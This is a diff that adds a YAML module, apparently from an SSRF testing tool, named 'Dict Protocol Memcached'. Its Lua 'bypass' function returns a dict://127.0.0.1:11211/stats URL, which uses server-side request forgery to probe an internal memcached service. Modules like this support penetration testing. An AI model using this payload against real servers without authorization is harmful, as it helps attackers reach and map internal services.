@@ -1,0 +1,24 @@
+meta:
+  id: dict_memcached
+  version: 1
+  name: "Dict Protocol Memcached"
+  description: "Uses dict:// to probe memcached"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 60
+  confidence: 60
+  severity: medium
+  tags: [dict, memcached, internal]
+  references: []
+match:
+  schemes: [http, https, dict]
+  requires: [hostname]
+  supports: [dict]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "dict://127.0.0.1:11211/stats" }
+    end
